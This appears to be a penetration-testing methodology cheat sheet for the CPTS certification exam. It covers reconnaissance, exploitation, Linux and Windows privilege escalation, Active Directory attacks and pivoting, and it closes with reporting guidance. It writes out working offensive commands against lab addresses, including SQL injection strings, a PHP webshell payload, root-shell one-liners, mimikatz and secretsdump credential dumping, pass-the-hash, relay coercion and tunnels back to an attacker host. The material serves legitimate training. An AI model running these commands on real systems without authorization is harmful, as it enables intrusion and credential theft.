# CPTS Pentesting Methodology

> **Complete step-by-step methodology** for the CPTS exam and real-world penetration tests. Follow this structure for every engagement.

---

## Table of Contents
1. [[#1 Information Gathering]]
2. [[#2 Vulnerability Assessment]]
3. [[#3 Exploitation]]
4. [[#4 Post Exploitation]]
5. [[#5 Lateral Movement]]
6. [[#6 Reporting]]
7. [[#Port Decision Tree]]

---

## 1. Information Gathering

### Goal
Map the attack surface: discover all hosts, services, and potential entry points.

### 1.1 Passive Reconnaissance

**Objective:** Gather intel without touching the target.

| Activity | Tools | Commands |
|----------|-------|----------|
| Whois Lookups | `whois` | `whois target.com` |
| DNS Enum | `dnsrecon`, `dig`, `nslookup` | `dnsrecon -d target.com` |
| Subdomain Enum | `sublist3r`, `amass`, `subfinder` | `sublist3r -d target.com` |
| Email Harvesting | `theHarvester` | `theHarvester -d target.com -b google` |
| Technology Recon | `whatweb`, `wappalyzer` | `whatweb https://target.com` |
| Google Dorking | Manual | `site:target.com intitle:"login"` |
| Shodan | `shodan` | `shodan search hostname:target.com` |
| Certificate Transparency | `crt.sh` | `curl -s https://crt.sh/?q=%.target.com` |

**What to look for:**
- Subdomains, mail servers, DNS records (SPF, DMARC, TXT)
- Technology stack (CMS, framework versions)
- Employee emails (for password spraying)
- Leaked credentials (haveibeenpwned, dehashed)
- GitHub repos with API keys or credentials

**Mistakes to avoid:**
- Skipping passive recon and going straight to active scanning
- Ignoring subdomain enumeration (many apps live on subdomains)
- Not checking robots.txt, sitemap.xml, and .well-known/

### 1.2 Active Reconnaissance

**Objective:** Identify live hosts and open ports.

#### Host Discovery
```bash
# Ping sweep
nmap -sn 10.10.10.0/24

# Netdiscover (ARP)
netdiscover -r 10.10.10.0/24

# Masscan (fast port sweep)
masscan 10.10.10.0/24 -p22,80,443,445,3389 --rate=1000
```

#### Port Scanning Strategy

```bash
# Step 1: Quick top-1000 scan (identify low-hanging fruit)
nmap -T4 -Pn --top-ports 1000 -oA quick 10.10.10.10

# Step 2: Full port scan (all 65535) on interesting targets
nmap -p- --min-rate=1000 -T4 -Pn -oA fulltcp 10.10.10.10

# Step 3: Service enumeration on discovered ports
nmap -p $(cat fulltcp.nmap | grep ^[0-9] | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') \
     -sC -sV -Pn -oA services 10.10.10.10

# Step 4: UDP scan (top 20 UDP ports)
nmap -sU --top-ports 20 -Pn -oA udp 10.10.10.10

# Step 5: NSE vulnerability scripts
nmap -p 445 --script vuln,smb-enum-shares,smb-os-discovery -Pn 10.10.10.10
```

### 1.3 Service Enumeration (Deep Dive)

For each open port, use [[14 - Common Ports and Services/Port Reference]] for specific commands. Here are the critical ones:

#### SMB (139, 445)
```bash
# Basic enumeration
smbclient -L //10.10.10.10 -N
smbmap -H 10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u '' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'guest' -p '' --shares

# Enum4linux (full)
enum4linux -a 10.10.10.10

# RPC enumeration
rpcclient -U "" -N 10.10.10.10
rpcinfo -p 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> srvinfo

# Nmap scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols -Pn 10.10.10.10
```

**What to look for:**
- Null session / guest access
- Writable shares
- Username lists (for password attacks)
- SMB signing disabled (relay potential)
- MS17-010 (EternalBlue)

#### LDAP (389, 636, 3268)
```bash
# Anonymous bind
ldapsearch -H ldap://10.10.10.10 -x -b "dc=domain,dc=local" -s base

# Dump everything
ldapsearch -H ldap://10.10.10.10 -x -b "dc=domain,dc=local"

# BloodHound data collection
bloodhound-python -u '' -p '' -d domain.local -ns 10.10.10.10 -c All

# With credentials
ldapsearch -H ldap://10.10.10.10 -x -D "cn=admin,dc=domain,dc=local" -w 'password' -b "dc=domain,dc=local"
```

**What to look for:**
- Users, groups, computers (objectClass)
- Service accounts with SPNs
- Description fields with passwords
- ACLs with interesting permissions
- Domain admins group membership

#### DNS (53)
```bash
# Zone transfer (classic)
dig axfr @10.10.10.10 domain.local

# Bruteforce subdomains
for sub in $(cat subdomains.txt); do
  dig $sub.domain.local @10.10.10.10 | grep -v "NXDOMAIN"
done

# DNS enumeration
dnsrecon -d domain.local -t axfr -n 10.10.10.10
dnsenum --dnsserver 10.10.10.10 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt domain.local
```

#### Web (80, 443, 8080, 8443)
```bash
# Technology fingerprinting
whatweb http://10.10.10.10
curl -I http://10.10.10.10

# Directory busting
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# Virtual host discovery
ffuf -u http://10.10.10.10 -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Parameter fuzzing
ffuf -u http://10.10.10.10/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Vulnerability scanner
nikto -h http://10.10.10.10
```

**What to look for:**
- Login pages, admin panels
- File upload functionality
- API endpoints
- Parameter reflection (XSS/SSTI)
- SQL injectable parameters
- LFI/RFI via parameters
- Directory listing enabled
- Default credentials
- CMS versions (WordPress, Joomla, Drupal)

#### Common Mistakes to Avoid
- Scanning only top-1000 ports (services on high ports)
- Skipping UDP scan (SNMP, NTP, DNS)
- Not enumerating null sessions on SMB/RPC
- Focusing only on web and ignoring other services
- Not checking for writable SMB shares
- Forgetting to check if SMB signing is disabled

---

## 2. Vulnerability Assessment

### Goal
Identify exploitable vulnerabilities from enumeration data.

### 2.1 Web Vulnerability Assessment

```bash
# Automated scanning
nikto -h http://10.10.10.10 -C all
nuclei -u http://10.10.10.10 -t /root/nuclei-templates/

# WPScan (WordPress specific)
wpscan --url http://10.10.10.10 --enumerate u,vp,vt

# SQLMap (if SQLi suspected)
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs

# XSSTrike (XSS discovery)
python3 xsstrike.py -u "http://10.10.10.10/page.php?id=1"

# Joomscan (Joomla)
joomscan -u http://10.10.10.10
```

### 2.2 Authentication Testing
```bash
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# Password spraying (use CrackMapExec)
crackmapexec smb 10.10.10.10 -u users.txt -p 'Welcome1' --continue-on-success
```

### 2.3 Version-Based Vulnerability Identification
```bash
# Search for exploits
searchsploit "Apache 2.4.49"
searchsploit -t "Windows 10"

# Check against known CVEs
# Cross-reference service versions with CVEdetails.com or NVD
```

### What to Look For
| Vulnerability | Key Indicators |
|---------------|----------------|
| SQL Injection | Error messages, URL parameters, form inputs |
| XSS | Reflected parameters, input fields |
| LFI | `?page=`, `?file=`, `?include=` parameters |
| Command Injection | `?cmd=`, `?exec=`, ping/curl functionality |
| File Upload | Upload forms without validation |
| SSRF | URL fetching features, PDF generators |
| SSTI | Template expressions reflected in output |
| Open Redirect | `?redirect=`, `?next=`, `?url=` parameters |

### Mistakes to Avoid
- Relying 100% on automated scanners (false positives/negatives)
- Not testing for logical vulnerabilities (IDOR, privilege escalation)
- Brute forcing without rate limiting or account lockout awareness
- Skipping authenticated testing when credentials are found

---

## 3. Exploitation

### Goal
Gain initial access to the target.

### 3.1 Web Exploitation

#### SQL Injection
```sql
-- Test for SQLi
' OR '1'='1
' UNION SELECT 1,2,3-- -
' UNION SELECT @@version,user(),database()-- -

# Automate with SQLMap
sqlmap -u "http://10.10.10.10/page.php?id=1" --dump
sqlmap -r request.txt --batch --os-shell
```

#### LFI to RCE
```bash
# Basic LFI
http://10.10.10.10/?page=../../../etc/passwd

# PHP Wrappers (if PHP)
http://10.10.10.10/?page=php://filter/convert.base64-encode/resource=config.php
http://10.10.10.10/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log Poisoning (if LFI and logs accessible)
http://10.10.10.10/?page=../../../../var/log/apache2/access.log
# Inject PHP in User-Agent: <?php system($_GET['c']); ?>
# Then: http://10.10.10.10/?page=../../../../var/log/apache2/access.log&c=id
```

#### File Upload
```bash
# If PHP file upload is available:
# 1. Upload reverse shell: revshells.php
# 2. Change extension tricks: .phtml, .php5, .php7, .php.jpg
# 3. Modify Content-Type: image/gif
# 4. Double extension: revshell.php.jpg
# 5. Null byte injection: revshell.php%00.jpg (older PHP)
# 6. .htaccess bypass (upload .htaccess first with AddType application/x-httpd-php .txt)
```

#### SSRF
```bash
# Classic SSRF
http://10.10.10.10/fetch?url=http://127.0.0.1/admin
http://10.10.10.10/fetch?url=file:///etc/passwd
http://10.10.10.10/fetch?url=gopher://127.0.0.1:6379/_*2%0d%0a...

# SSRF to Service Exploitation
# Use gopher protocol to interact with internal services (Redis, MySQL, SMTP)
```

### 3.2 Password Attacks

```bash
# Hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # Kerberos 5 TGS-REP

# Kerberoasting
impacket-GetUserSPNs -dc-ip 10.10.10.10 domain.local/user:password -request

# AS-REP Roasting
impacket-GetNPUsers -dc-ip 10.10.10.10 domain.local/ -usersfile users.txt

# NTLM Relay
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 3.3 Active Directory Exploitation

#### BloodHound Attack Path Analysis
```bash
# Collect data
bloodhound-python -d domain.local -u user -p 'password' -ns 10.10.10.10 -c All

# Analyze in BloodHound GUI
# Key queries:
# - Find all Domain Admins
# - Find shortest paths to Domain Admins
# - Find users with most privileges
# - Kerberoastable users
# - AS-REP roastable users
# - Computers with unconstrained delegation
```

#### Common AD Attack Paths

**Path 1: Kerberoasting -> Domain Admin**
```
Compromised User -> Enumerate SPNs -> Kerberoast -> Crack Hash ->
Access Service Account -> ACL Abuse -> Domain Admin
```

**Path 2: AS-REP Roasting**
```
No Pre-Auth User -> GetNPUsers.py -> Crack Hash -> Access as user
```

**Path 3: ACL Abuse**
```
GenericAll on User A -> Reset password -> Access User A ->
GenericWrite on Group -> Add to group -> New privileges
```

**Path 4: DCSync**
```
Replication Privileges -> secretsdump.py -> Dump all hashes -> DA
```

**Path 5: AD CS Abuse (ESC1)**
```
Enroll Access -> Misconfigured Certificate Template -> Request cert as DA ->
Certificate authentication -> Domain Admin
```

```bash
# DCSync
impacket-secretsdump domain.local/user:'password'@10.10.10.10

# AD CS Abuse
certipy find -u user@domain.local -p 'password' -dc-ip 10.10.10.10
certipy req -u user@domain.local -p 'password' -ca CA-SERVER -template VulnTemplate

# Kerberos delegation abuse
impacket-findDelegation -dc-ip 10.10.10.10 domain.local/user:'password'
```

### 3.4 Network Exploitation

```bash
# Metasploit
msfconsole -q
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Public exploit
searchsploit -m 12345
python exploit.py 10.10.10.10

# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

### Mistakes to Avoid
- Not trying default credentials immediately
- Spending too long on manual exploitation when Metasploit would work
- Not checking for public exploits before writing custom ones
- Forgetting to set up a listener before executing a reverse shell
- Not checking for outbound firewall rules (which protocol works for reverse shells)
- Running meterpreter when a simpler shell would do (avoid OPSEC for no reason)

---

## 4. Post Exploitation

### Goal
Escalate privileges, dump credentials, establish persistence.

### 4.1 Linux Privilege Escalation

#### Automated Enumeration
```bash
# LinPEAS (most comprehensive)
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Linux Smart Enumeration
wget http://10.10.14.5/lse.sh
chmod +x lse.sh && ./lse.sh -l1

# pspy (process monitor - watch for cron jobs)
wget http://10.10.14.5/pspy64
chmod +x pspy64 && ./pspy64
```

#### Manual Checks
```bash
# SUID binaries
find / -perm -4000 2>/dev/null

# SGID binaries
find / -perm -2000 2>/dev/null

# Sudo privileges
sudo -l

# Writable files (find anything interesting)
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Writable directories in PATH
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Cron jobs (check /etc/crontab, /var/spool/cron/)
cat /etc/crontab
ls -la /etc/cron*

# Capabilities
getcap -r / 2>/dev/null

# Kernel version (check for exploits)
uname -a
cat /etc/os-release

# Mounted shares
cat /etc/fstab
mount

# Docker group membership (Docker escape)
groups
docker run -v /:/mnt -it alpine chroot /mnt /bin/sh

# History files
cat ~/.bash_history
cat ~/.viminfo
```

#### Common PE Vectors

| Vector | Check | Exploit |
|--------|-------|---------|
| SUID Binary | `find / -perm -4000` | GTFOBins for the binary |
| Sudo | `sudo -l` | GTFOBins matching entries |
| Cron Jobs | `/etc/crontab`, pspy | Writable script -> replace with reverse shell |
| Kernel Exploit | `uname -a` | `searchsploit linux kernel <version>` |
| Writable `/etc/passwd` | `ls -la /etc/passwd` | Generate password hash, add root user |
| Docker | `groups` | Mount host filesystem |
| Capabilities | `getcap -r /` | Abuse cap_setuid+ep on python/perl |
| NFS Shares | `cat /etc/exports` | Mount as root if no_root_squash |
| tmux/screen | Check for sessions | Reattach to root session |
| LXD Group | `groups` | LXD container escape |
| PATH Hijack | `find / -writable -type d` | Create malicious binary matching missing command |

```bash
# Exploit Examples

# SUID Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Sudo tar (if sudo -l shows tar)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Capability python
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# CVE-2021-4034 (Polkit)
python3 -c 'print("Dynamite was here")' # Actually download and compile pwnkit.c
```

### 4.2 Windows Privilege Escalation

#### Automated Enumeration
```powershell
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Sherlock (kernel exploits)
powershell -ep bypass
. .\Sherlock.ps1
Find-AllVulns

# JAWS
powershell -ep bypass
. .\jaws-enum.ps1
Invoke-JAWS
```

#### Manual Checks
```cmd
REM System info
systeminfo
wmic qfe list brief   REM Installed patches

REM Users and groups
whoami /all
net user
net localgroup
net localgroup administrators

REM Services
wmic service list brief
sc query
sc qc ServiceName    REM Query service config
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

REM Running processes
tasklist /v
Get-Process (powershell)

REM Registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

REM AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

REM Credentials in files
findstr /si password *.txt *.ini *.config *.xml *.bat *.ps1

REM Credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Token Privileges Check
```cmd
whoami /priv
```

| Privilege | Exploit |
|-----------|---------|
| SeImpersonatePrivilege | JuicyPotato, RoguePotato, PrintSpoofer |
| SeAssignPrimaryTokenPrivilege | JuicyPotato, RoguePotato |
| SeBackupPrivilege | `reg save hklm\sam sam.hive`, `robocopy /b` |
| SeRestorePrivilege | Replace system files |
| SeTakeOwnershipPrivilege | Take ownership of protected files |
| SeDebugPrivilege | Process injection (mimikatz) |
| SeLoadDriverPrivilege | Load malicious driver |

#### Credential Dumping
```bash
# From Linux attacking Windows (using impacket)
impacket-secretsdump domain.local/user:'password'@10.10.10.10

# Mimikatz (must be admin)
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::lsa /patch

# SAM registry hive
reg save hklm\sam sam.hive
reg save hklm\system system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# NTDS.dit
impacket-secretsdump -just-dc domain.local/user:'password'@10.10.10.10
```

### Mistakes to Avoid
- Running LinPEAS/WinPEAS and ignoring the output (read every finding)
- Not checking sudo -l immediately on Linux
- Forgetting to look at running processes (pspy is gold)
- Not checking for passwords in config files, scripts, history
- Skipping manual checks even after automated tools
- Not checking the version of Windows/Linux for kernel exploits
- Running cred dumping tools without checking AV/EDR

---

## 5. Lateral Movement

### Goal
Move from compromised host to other hosts, escalate privileges across the domain.

### 5.1 Windows Lateral Movement

#### Pass the Hash (PtH)
```bash
# Using Impacket
impacket-wmiexec -hashes LMHASH:NTHASH domain.local/user@10.10.10.20
impacket-psexec -hashes LMHASH:NTHASH domain.local/user@10.10.10.20
impacket-smbexec -hashes LMHASH:NTHASH domain.local/user@10.10.10.20

# Using CrackMapExec (spray hashes across subnet)
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTHASH -x whoami

# Using Evil-WinRM (requires WinRM open)
evil-winrm -i 10.10.10.20 -u Administrator -H NTHASH
```

#### Pass the Ticket (PtT)
```cmd
REM On Windows target (mimikatz)
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

REM On Linux (impacket)
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k domain.local/user@target.domain.local
```

#### Overpass the Hash
```cmd
REM On Windows target (mimikatz)
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTHASH /run:powershell
REM In new PowerShell
klist   REM Should show TGT
net use \\DC01
```

#### PsExec
```bash
# Impacket
impacket-psexec domain.local/user:'password'@10.10.10.20

# Native (Windows)
psexec \\target cmd.exe
```

### 5.2 Pivoting and Tunneling

#### Chisel (SOCKS Proxy)
```bash
# On attack box (server)
chisel server -p 8080 --reverse

# On compromised target (client)
chisel client 10.10.14.5:8080 R:socks

# Use with proxychains
proxychains nmap -sT -Pn -p 445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u user -p 'password'

# Chisel forward port
chisel client 10.10.14.5:8080 R:3389:10.10.10.20:3389
```

#### Ligolo-ng
```bash
# On attack box (proxy)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:443

# On compromised target (agent)
./agent -connect 10.10.14.5:443 -ignore-cert

# In proxy console
ligolo-ng >> session
ligolo-ng >> start
```

#### SSH Tunneling
```bash
# Local port forward (access internal service from attack box)
ssh -L 8080:internal-server:80 user@jumphost

# Remote port forward (expose local port to target)
ssh -R 4444:localhost:4444 user@10.10.14.5

# Dynamic port forward (SOCKS proxy)
ssh -D 9050 user@jumphost

# SSHuttle (full VPN-like tunnel)
sshuttle -r user@10.10.10.10 10.10.20.0/24
```

#### Socat
```bash
# Port forwarding
socat TCP-LISTEN:4444,fork TCP:10.10.10.20:445

# Reverse shell relay
socat TCP-LISTEN:443,fork EXEC:/bin/bash
```

### 5.3 Active Directory Lateral Movement

#### SMB Relay Attack
```bash
# Setup relay (on attack box)
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Coerce authentication (from compromised target)
# Using MS-RPRN or MS-EFSRPC
python3 printerbug.py domain.local/user:'password'@10.10.10.20 10.10.14.5
python3 petitpotam.py -d domain.local -u user -p 'password' 10.10.14.5 10.10.10.20
```

#### DCOM Execution
```cmd
REM From Windows
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.20"))
$com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc.exe", "Minimized")
```

#### WMI Execution
```bash
# Using Impacket
impacket-wmiexec domain.local/user:'password'@10.10.10.20

# Using CrackMapExec
crackmapexec smb 10.10.10.20 -u user -p 'password' -M wmi -x 'whoami'
```

### Pivoting Decision Tree
```
Can I reach the target directly?
+-- YES -> Standard exploitation
+-- NO -> Pivoting needed
    +-- Compromised host has SSH? -> SSH tunneling
    +-- Compromised host has Python? -> Chisel
    +-- Compromised host is Windows without SSH? -> plink or Ligolo
    +-- Need full network access? -> Ligolo-ng or SSHuttle
```

### Mistakes to Avoid
- Not setting up proxychains properly (make sure it's configured)
- Trying to pass through proxy with UDP scans (won't work)
- Forgetting to add routes for pivoted networks
- Not checking which protocols can egress (outbound firewall rules)
- Running nmap SYN scan through SOCKS (only TCP connect scan works)
- Not checking for AV/EDR before dumping creds on target

---

## 6. Reporting

### Goal
Document findings professionally for the CPTS exam report.

### Report Structure

#### 1. Executive Summary
- 1-2 pages for non-technical audience
- Scope of engagement
- Overall risk rating (Critical/High/Medium/Low)
- Key findings (top 3-5 by severity)
- Business impact language
- Positive observations (what they got right)

#### 2. Technical Findings
Each finding should include:
```
Title: [Vulnerability Name]
Severity: [Critical/High/Medium/Low] (CVSS 3.1 Score)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Asset: [IP/Hostname]
Status: [Fixed/Accepted/Open]
---
Description:
- What the vulnerability is
- Where it was found
- Why it's dangerous

Proof of Concept:
- Step-by-step reproduction
- Commands used (code blocks)
- Screenshots with timestamps

Impact:
- What an attacker can achieve
- Data at risk
- Business impact

Remediation:
- Specific fix instructions
- Configuration changes
- Patching recommendations
- References (CVE, vendor docs)
```

#### 3. Methodology
- Tools used
- Approach
- Scope and limitations

#### 4. Appendices
- Complete Nmap scan results
- Password lists found
- Extracted hashes
- Network diagrams
- Compromised credentials

### Evidence Collection Best Practices
```bash
# Save all scan results
mkdir -p evidence/{scans,exploits,post-exploit,credentials,screenshots}

# Save Nmap output
cp *.nmap *.gnmap *.xml evidence/scans/

# Save web screenshots
python3 -m http.server 8080  # serve evidence locally

# Document every command with output
script -a evidence/terminal.log

# Note: CPTS requires screenshots as evidence
# Each screenshot should show:
# - The command run
# - The output showing the exploit worked
# - A timestamp (or system time visible)
```

### CVSS 3.1 Scoring Quick Reference
| Score | Severity | Example |
|-------|----------|---------|
| 9.0-10.0 | Critical | RCE as root/nt authority\system |
| 7.0-8.9 | High | SQL Injection with data exfil |
| 4.0-6.9 | Medium | XSS, low-priv information disclosure |
| 0.1-3.9 | Low | Banner disclosure, missing headers |
| 0.0 | None | No risk |

---

## Port Decision Tree

```
Port is open -> What do I try next?

--21 (FTP)
  +-- Anonymous login? -> ftp anonymous@target
  +-- Download everything -> wget -r ftp://target
  +-- Known vuln version? -> searchsploit ftp

--22 (SSH)
  +-- Version vuln? -> searchsploit [version]
  +-- Brute force? -> hydra -l root -P rockyou.txt ssh://target
  +-- Keys found? -> ssh -i key.pem user@target
  +-- Weak config (root login, old crypto)?

--23 (Telnet)
  +-- Brute force? -> hydra -l admin -P rockyou.txt telnet://target
  +-- Interesting banner? -> nc target 23

--25 (SMTP)
  +-- User enumeration? -> smtp-user-enum -M VRFY -U users.txt target
  +-- Open relay? -> test with swaks or telnet
  +-- Banner grab -> nc target 25

--53 (DNS)
  +-- Zone transfer? -> dig axfr @target domain.local
  +-- Subdomain brute? -> dnsrecon or ffuf
  +-- Dnsmasq/CVE? -> check version

--80/443 (HTTP/S)
  +-- Web app? -> whatweb, curl -I, browser
  +-- Dir busting? -> ffuf, gobuster
  +-- VHOST discovery? -> ffuf with Host header
  +-- Tech vulns? -> nikto, nuclei
  +-- SQLi? -> sqlmap on params
  +-- LFI? -> test page=../../../etc/passwd
  +-- File upload? -> upload test + bypass
  +-- Default creds? -> admin:admin, etc.

--110/995 (POP3)
  +-- Brute force? -> hydra
  +-- Read emails? -> telnet, openssl s_client

--135 (MSRPC)
  +-- Enum users? -> rpcclient -U "" -N target
  +-- Check for MS08-067?

--139/445 (SMB)
  +-- Null session? -> smbclient -L //target -N
  +-- Guest access? -> smbmap -H target -u guest -p ''
  +-- Share enumeration? -> enum4linux -a target
  +-- SMB signing disabled? -> potential relay
  +-- EternalBlue (MS17-010)? -> nmap --script smb-vuln-ms17-010
  +-- User enum via RPC? -> rpcclient $> enumdomusers
  +-- Brute force? -> crackmapexec smb target -u users.txt -p passwords.txt

--143/993 (IMAP)
  +-- Read emails with credentials

--161 (SNMP)
  +-- Public community? -> snmpwalk -v2c -c public target
  +-- Enumerate processes, users, software?

--389/636 (LDAP/S)
  +-- Anonymous bind? -> ldapsearch -H ldap://target -x -b "dc=domain,dc=local"
  +-- Dump with credentials? -> ldapdomaindump

--443 (HTTPS)
  +-- Check certificate -> openssl s_client -connect target:443
  +-- Same as web above

--464 (Kerberos)
  +-- Kerberoast? -> GetUserSPNs.py

--500 (ISAKMP)
  +-- VPN enumeration? -> ike-scan target

--593 (MSRPC over HTTP)
  +-- Same as port 135, check for RPC

--636 (LDAPS)
  +-- Same as LDAP, encrypted

--873 (Rsync)
  +-- List modules? -> rsync -av --list-only rsync://target

--993 (IMAPS)
  +-- Same as IMAP, encrypted

--995 (POP3S)
  +-- Same as POP3, encrypted

--1433 (MSSQL)
  +-- Default creds (sa:sa)? -> sqsh or mssqlclient.py
  +-- Execute commands? -> xp_cmdshell
  +-- Link attack? -> check linked servers

--1521 (Oracle)
  +-- Default creds? -> odat
  +-- TNS poisoning?

--2049 (NFS)
  +-- Show mounts? -> showmount -e target
  +-- Mount accessible? -> mount -t nfs target:/share /mnt
  +-- Root squashing? -> mount with -o 'vers=3' and check UID 0 files

--2375 (Docker)
  +-- Docker API exposed? -> docker -H tcp://target:2375 ps
  +-- Container escape? -> docker -H tcp://target:2375 run -v /:/mnt alpine

--3306 (MySQL)
  +-- Default creds (root:root)? -> mysql -h target -u root -p
  +-- SQL version + vulns?

--3389 (RDP)
  +-- BlueKeep (CVE-2019-0708)? -> check version
  +-- NLA required?
  +-- Brute force? -> crowbar or hydra

--3632 (Distcc)
  +-- RCE via distccd? -> searchsploit distcc

--3690 (SVN)
  +-- Checkout repo? -> svn checkout svn://target

--4369 (Erlang Port Mapper)
  +-- Erlang cookie attack?

--5432 (PostgreSQL)
  +-- Default creds (postgres:postgres)? -> psql -h target -U postgres
  +-- RCE via? -> CREATE FUNCTION system

--5900 (VNC)
  +-- No auth? -> vncviewer target
  +-- Brute force? -> hydra

--5985/5986 (WinRM)
  +-- Credentials? -> evil-winrm -i target -u user -p 'password'
  +-- Pass the hash? -> evil-winrm -i target -u user -H NTHASH

--6379 (Redis)
  +-- No auth? -> redis-cli -h target
  +-- RCE via SSH key or cron? -> config set dir /root/.ssh && config set dbfilename authorized_keys

--7001 (WebLogic)
  +-- Known vulns (CVE-2017-10271, etc.)?

--8080 (HTTP Alternate)
  +-- Same as web, often proxy or Java apps

--8443 (HTTPS Alternate)
  +-- Same as web

--9200 (Elasticsearch)
  +-- No auth? -> curl target:9200/_search?pretty

--27017 (MongoDB)
  +-- No auth? -> mongo target --eval "db.adminCommand('listDatabases')"

--50070 (HDFS)
  +-- HDFS admin interface? -> datanode information
```

---

## Final Notes for CPTS

1. **Enumeration is king** -- The exam rewards thorough enumeration over brute force
2. **Take notes as you go** -- Everything you do should be documented for the report
3. **Pivot early** -- Don't spend all your time on one box if you have access to multiple
4. **Use your 10 days** -- Take breaks, don't burn out on day 1
5. **Report matters** -- Even if you pwn everything, a poor report can fail you
6. **Check all hosts** -- The exam environment has multiple hosts, enumerate every one
7. **BloodHound is your friend** -- If you find AD, run BloodHound immediately
8. **[[00 - Methodology and Workflow/Quick Reference Card|Quick Reference Card]]** -- Keep this open during the exam
9. **[[14 - Common Ports and Services/Port Reference|Port Reference]]** -- Reference for every service you encounter

*Last Updated: 2026-06-15*
